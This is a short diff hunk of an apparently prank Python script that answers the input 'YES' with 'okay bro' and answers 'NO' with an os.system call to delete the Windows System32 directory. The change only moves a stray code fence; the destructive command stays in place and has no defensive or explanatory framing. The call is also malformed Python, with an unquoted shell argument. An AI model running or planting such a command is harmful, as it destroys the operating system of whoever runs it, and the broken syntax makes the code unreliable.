@@ -10,4 +10,5 @@ ans = input()
 if ans == 'YES':
   print('okay bro')
 if ans == 'NO':
-  os.system(rmdir "C:/Windows/System32")```
+  os.system(rmdir "C:/Windows/System32")
+  ```
